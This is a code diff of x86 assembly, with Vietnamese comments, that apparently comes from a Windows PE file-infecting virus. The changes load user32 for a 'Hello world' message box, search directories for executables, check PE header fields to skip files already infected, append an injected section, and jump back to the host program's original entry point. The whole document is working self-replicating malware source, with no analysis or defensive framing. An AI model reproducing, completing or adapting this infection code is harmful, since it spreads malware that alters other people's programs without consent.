@@ -125,6 +125,18 @@ mov		[offset gpa + ebp], eax
 mov		[offset old + ebp], ecx
 mov		[offset delta + ebp], ebp
 
+;Lay ham LoadLibraryA
+mov		eax, offset loadlib
+add		eax, ebp
+mov		ebx, [offset kernel32 + ebp]
+mov		ecx, [offset gpa + ebp] 
+
+push	eax
+push	ebx
+call	ecx
+
+mov		[offset load + ebp], eax
+
 
 ;Lay ham FindFirstFile
 mov		eax, offset findfirstfile
@@ -188,16 +200,6 @@ push	ebx
 call	ecx
 mov		[offset wf + ebp], eax
 
-;Lay ham MessageBox
-mov		eax, offset messagebox
-add		eax, ebp
-mov		ebx, [offset kernel32 + ebp]
-mov		ecx, [offset gpa + ebp] 
-push	eax
-push	ebx
-call	ecx
-mov		[offset mg + ebp], eax
-
 ;Lay ham lstrlen
 mov		eax, offset len
 add		eax, ebp
@@ -238,6 +240,31 @@ push	ebx
 call	ecx
 mov		[offset gmfn + ebp], eax
 
+;goi user32.dll
+
+mov		eax, offset lib_user32
+add		eax, ebp
+mov		ecx, [offset load + ebp]
+
+push	eax
+call	ecx
+
+mov		ecx, offset user32
+add		ecx, ebp
+mov		[ecx], eax
+
+;lay ham MessageBox
+
+mov		eax, offset messagebox
+add		eax, ebp
+mov		ebx, [offset user32 + ebp]
+mov		ecx, [offset gpa + ebp] 
+push	eax
+push	ebx
+call	ecx
+mov		[offset mg + ebp], eax
+
+
 ;Lay ham GetCurrentDirectoryA
 
 mov		eax, offset getpath
@@ -265,6 +292,141 @@ mov		ebx, [offset delta + ebp]
 push	ebx
 push	ecx
 call	browse_files
+
+
+lea		eax, mg
+add		eax, ebp
+mov		ebx, offset tit
+add		ebx, ebp
+push	0
+push	0
+push	ebx
+push	0
+call	eax
+
+	
+;--------------------------------------------
+mov		eax, offset file_name
+add		eax, ebp
+mov		ebx, offset gmfn
+add		ebx, ebp
+mov		ebx, [ebx]
+
+push	262
+push	eax
+call	ebx
+
+;---------------------------------------------
+mov		eax, offset file_name
+add		eax, ebp
+mov		ebx, offset cf
+add		ebx, ebp
+mov		ebx, [ebx]
+
+push	0
+push	80h					;normal
+push	3					;OPEN_EXISTING
+push	0
+push	00000001h			;read 
+push	080000000h			;read 
+push	eax					;pathtmp
+call	ebx					;CreateFile	
+
+mov		h_file, eax
+
+;-----------------------------------------
+lea		edx, ovl
+add		edx, ebp
+add		edx, 8
+mov		dword ptr [edx], 60
+
+mov		eax, offset tmp_1
+add		eax, ebp
+mov		ebx, offset rf
+add		ebx, ebp
+mov		ebx, [ebx]
+
+mov		ecx, offset h_file
+add		ecx, ebp
+mov		ecx, [ecx]
+lea		edx, ovl
+
+push	edx
+push	0
+push	4
+push	eax	
+push	ecx
+call	ebx
+
+mov		eax, [offset tmp_1+ebp]
+add		eax, 34h
+
+;-----------------
+lea		edx, ovl
+add		edx, ebp
+add		edx, 8
+mov		dword ptr [edx], eax
+
+mov		eax, offset tmp_2
+add		eax, ebp
+mov		ebx, offset rf
+add		ebx, ebp
+mov		ebx, [ebx]
+
+mov		ecx, offset h_file
+add		ecx, ebp
+mov		ecx, [ecx]
+lea		edx, ovl
+
+push	edx
+push	0
+push	4
+push	eax	
+push	ecx
+call	ebx
+
+;------------------
+mov		eax, [offset tmp_1+ebp]
+add		eax, 0c4h
+
+lea		edx, ovl
+add		edx, ebp
+add		edx, 8
+mov		dword ptr [edx], eax
+
+mov		eax, offset tmp_3
+add		eax, ebp
+mov		ebx, offset rf
+add		ebx, ebp
+mov		ebx, [ebx]
+
+mov		ecx, offset h_file
+add		ecx, ebp
+mov		ecx, [ecx]
+lea		edx, ovl
+
+push	edx
+push	0
+push	4
+push	eax	
+push	ecx
+call	ebx
+;----------------------
+mov		eax, offset clh
+add		eax, ebp
+mov		eax, [eax]
+
+mov		ebx, h_file
+add		ebx, ebp
+mov		ebx, [ebx]
+push	ebx
+call	eax
+
+;-----------------------
+mov		eax, tmp_2
+add		eax, tmp_3
+
+jmp		eax
 ;---------------------------------------------------------------------
 inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	
@@ -641,6 +803,7 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	
 	;ghi them section vua sua vao cuoi bang section
 	xor		ebx, ebx
+	xor		eax, eax
 	mov		bx, nos_injected
 	mov		al, 28h
 	mul		bx
@@ -806,7 +969,7 @@ inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
 	add		ecx, 8
 	mov		dword ptr [ecx], eax
 	lea		ecx, ov
-	lea		edx, aop_virus
+	lea		edx, aop_injected
 	
 	push	ecx
 	push 	0
@@ -829,9 +992,23 @@ browse_files PROC uses eax ebx ecx edx, pathFile:dword, del:dword
 
 	LOCAL hfind:dword
 	LOCAL pathtmp[262]:byte
-
+	LOCAL tmp_5:dword
+	LOCAL tmp_6:dword
+	LOCAL ovl[5]:dword
 
 find_first_file:
+
+xor		ebx, ebx
+mov		eax, del
+add		eax, offset msz
+mov		eax, [eax]
+mov		ebx, 20
+lea		ecx, ovl
+
+push	ebx			;size
+push	ecx			;buff
+call 	eax			;call RtlZeroMemory
+
 
 xor		ebx, ebx
 mov		eax, del
@@ -903,7 +1080,6 @@ jnz		check_home	;folder thi check . va .., khong thi tim file thuc thi de lay
 
 ;check file thuc thi de lay file
 
-
 mov		eax, del
 add		eax, offset strlen
 mov		eax, [eax]
@@ -921,8 +1097,8 @@ add		ecx, eax
 mov		edx, del
 add		edx, offset cFileName
 		
-push	edx					;pathtmp[eax]
-push	ecx					;cFileName
+push	edx					;cFileName
+push	ecx					;pathtmp[eax]
 call	ebx					;call lstrcpy
 
 lea		eax, pathtmp
@@ -971,6 +1147,94 @@ cmp		ax, 5a4dh
 
 jne		close_handle
 
+;------------------------------------------
+lea		edx, ovl
+add		edx, 8
+mov		dword ptr [edx], 60
+
+lea		eax, tmp_5
+mov		ebx, offset rf
+add		ebx, ebp
+mov		ebx, [ebx]
+
+mov		ecx, offset h_file
+add		ecx, ebp
+mov		ecx, [ecx]
+lea		edx, ovl
+
+push	edx
+push	0
+push	4
+push	eax	
+push	ecx
+call	ebx
+;----------------------------------------
+mov		eax, tmp_5
+add		eax, 0c0h
+
+lea		edx, ovl
+add		edx, ebp
+add		edx, 8
+mov		dword ptr [edx], eax
+
+lea		eax, tmp_6
+add		eax, ebp
+mov		ebx, offset rf
+add		ebx, ebp
+mov		ebx, [ebx]
+
+mov		ecx, offset h_file
+add		ecx, ebp
+mov		ecx, [ecx]
+lea		edx, ovl
+
+push	edx
+push	0
+push	4
+push	eax	
+push	ecx
+call	ebx
+;----------------------------------------------
+
+mov		eax, tmp_5
+add		eax, 0c4h
+
+lea		edx, ovl
+add		edx, ebp
+add		edx, 8
+mov		dword ptr [edx], eax
+
+lea		eax, tmp_5
+add		eax, ebp
+mov		ebx, offset rf
+add		ebx, ebp
+mov		ebx, [ebx]
+
+mov		ecx, offset h_file
+add		ecx, ebp
+mov		ecx, [ecx]
+lea		edx, ovl
+
+push	edx
+push	0
+push	4
+push	eax	
+push	ecx
+call	ebx
+;---------------------------------
+xor		eax, eax
+mov		eax, tmp_6
+cmp		eax, 0
+je		check_size
+jne		continue_inject
+check_size:
+
+xor		eax, eax
+mov		eax, tmp_5
+cmp		eax, 0
+
+jne		close_handle
+continue_inject:
 mov		ebx, del
 add		ebx, offset h_file
 mov		ebx,[ebx]
@@ -1132,8 +1396,10 @@ ret
 
 browse_files endp
 ;----------------------------------------------------------------------
-test	ebx, ebx
+
 ;------------------------------------------------------------------------
+
+ovl				dd 20 dup(0)
 delta			dd 0
 beg				dd 0
 kernel32		dd 0
@@ -1154,7 +1420,8 @@ strlen			dd 0
 strcpy			dd 0
 tmp				dd 0
 clh				dd 0
-
+user32			dd 0
+load			dd 0
 
 tit				db "Hello world" , 0
 getprocaddress 	db "GetProcAddress", 0
@@ -1176,7 +1443,10 @@ cpy				db "lstrcpyA", 0
 
 clshandle		db "CloseHandle", 0		 
 
-
+file_name		db 262 dup(0)
+tmp_1			dd 0
+tmp_2			dd 0
+tmp_3			dd 0
 ;_win32_find_data
 dwFileAttributes    dd 0
 time				dd 6 dup(0)
